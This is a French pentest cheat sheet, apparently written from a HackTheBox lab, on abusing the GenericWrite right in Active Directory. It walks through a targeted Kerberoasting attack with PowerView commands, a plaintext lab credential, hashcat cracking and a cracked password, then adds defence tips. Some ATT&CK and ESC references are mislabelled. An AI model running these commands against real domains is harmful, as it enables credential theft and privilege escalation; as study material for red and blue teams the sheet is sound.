# GenericWrite

***

## <mark style="color:red;">🧬 Fiche Technique : Abus de GenericWrite dans Active Directory</mark>

***

### <mark style="color:blue;">📌 Qu’est-ce que</mark> <mark style="color:blue;"></mark><mark style="color:blue;">`GenericWrite`</mark> <mark style="color:blue;"></mark><mark style="color:blue;">?</mark>

`GenericWrite` est un **droit d'accès ACL (Access Control List)** attribué à un utilisateur ou groupe sur un objet Active Directory (utilisateur, ordinateur, groupe, etc.).

> ➤ Si un utilisateur détient `GenericWrite` sur un objet, il peut **modifier presque tous ses attributs**, y compris :

* `servicePrincipalName` (SPN)
* `userPassword` / `unicodePwd`
* `scriptPath`, `homeDirectory`, etc.
* `altSecurityIdentities` (lié à ADCS abuse)

***

### <mark style="color:blue;">🧨 Pourquoi c’est dangereux ?</mark>

Un attaquant peut :

* Ajouter un SPN sur un autre utilisateur, **puis faire du Kerberoasting**
* Changer l'attribut `logonScript` pour exécuter du code
* Changer `userPassword` ou `unicodePwd` (cf. ForceChangePassword, `T1098.004`)
* Injecter un certificat (`ESC8`) via `altSecurityIdentities`

***

### <mark style="color:blue;">📂 MITRE ATT\&CK Mapping</mark>

| Tactic               | Technique                   | ID          |
| -------------------- | --------------------------- | ----------- |
| Privilege Escalation | Exploitation of Object ACLs | `T1484.002` |
| Credential Access    | Kerberoasting               | `T1558.003` |
| Defense Evasion      | Abuse of Permissions        | `T1098.004` |
| Persistence          | Account Manipulation        | `T1098`     |

***

### <mark style="color:blue;">🛠️ Exemple : Abus de GenericWrite pour faire du Kerberoasting</mark>

***

#### 🧾 Préparation : Import PowerView

```powershell
Import-Module ./PowerView.ps1
```

***

#### 🧾 Étape 1 — Ajouter un SPN sur l'utilisateur cible

```powershell
Set-DomainObject -Identity ETHAN -SET @{serviceprincipalname='kerberoast/ethan'}
```

✔️ Tu crées un faux Service Principal Name (`SPN`) sur le compte ETHAN.\
➡️ Cela permet de générer un TGS (Ticket Granting Service) associé à ce SPN.

***

#### 🧾 Étape 2 — S’authentifier avec le bon contexte

```powershell
$SecPassword = ConvertTo-SecureString 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('ADMINISTRATOR.HTB\emily', $SecPassword)
```

***

#### 🧾 Étape 3 — Récupérer le TGS

```powershell
Get-DomainSPNTicket -Credential $Cred -SPN 'kerberoast/ethan'
```

✔️ PowerView demande le **TGS lié au SPN ajouté**, qui est chiffré avec le NT hash du user (`ethan`).\
➡️ Ce TGS peut être **bruteforcé offline** pour récupérer le mot de passe.

***

### <mark style="color:blue;">🧪 Illustration : Abus GenericWrite + Kerberoasting</mark>

```mermaid
graph TD
    Attacker[Emily (GenericWrite sur Ethan)]
    AD_Object[Ethan (AD User)]
    SPN[Ajout SPN: kerberoast/ethan]
    TGS[TGS Ticket Dump via PowerView]
    Hashcat[Crack offline: hashcat -m 13100]

    Attacker -->|Set-DomainObject| AD_Object
    AD_Object --> SPN
    SPN --> TGS
    TGS --> Hashcat
```

***

### <mark style="color:blue;">💥 Résultat typique :</mark>

Extrait brut `Get-DomainSPNTicket` :

```
$krb5tgs$23$*ethan$KERBEROAST/ETHAN*...
```

Bruteforce avec Hashcat :

```bash
hashcat -m 13100 ethan.hash rockyou.txt
```

➡️ Crack réussi :

```
ethan : limpbizkit
```

***

### <mark style="color:blue;">🛡️ Défense & Détection</mark>

| Technique                     | Description                                     |
| ----------------------------- | ----------------------------------------------- |
| 🛑 Auditer les droits ACL     | Utiliser BloodHound / ACLScanner                |
| 📜 Logs d'événements Kerberos | `4624`, `4769` (service ticket requested)       |
| 🔥 Désactiver SPN inutiles    | Supprimer les SPN sur comptes utilisateurs      |
| ⚙️ GPO Hardened               | Ne jamais donner `GenericWrite` sauf nécessaire |

***

### 🧠 Commandes utiles complémentaires

🔎 **Lister les utilisateurs ayant `GenericWrite`** sur d'autres :

```powershell
Find-InterestingDomainAcl -ResolveGUIDs | ? { $_.Rights -match "GenericWrite" }
```

🔧 **Voir les SPNs existants** :

```powershell
Get-DomainUser -Identity ethan | Select -ExpandProperty servicePrincipalName
```

🧼 **Supprimer un SPN ajouté** :

```powershell
Set-DomainObject -Identity ETHAN -Clear servicePrincipalName
```

***

### ✅ Résumé Express

| Élément              | Valeur                                      |
| -------------------- | ------------------------------------------- |
| 🔐 Type d’abus       | GenericWrite ACL Abuse                      |
| 🎯 Cible             | Compte utilisateur AD                       |
| 🧪 Action            | Ajout de SPN                                |
| 🎟️ Objectif         | Générer un TGS pour Kerberoasting           |
| 💣 Impact            | Crack offline d’un mot de passe utilisateur |
| 🔓 Escalade possible | DCSync, Pass-The-Hash, etc.                 |

***
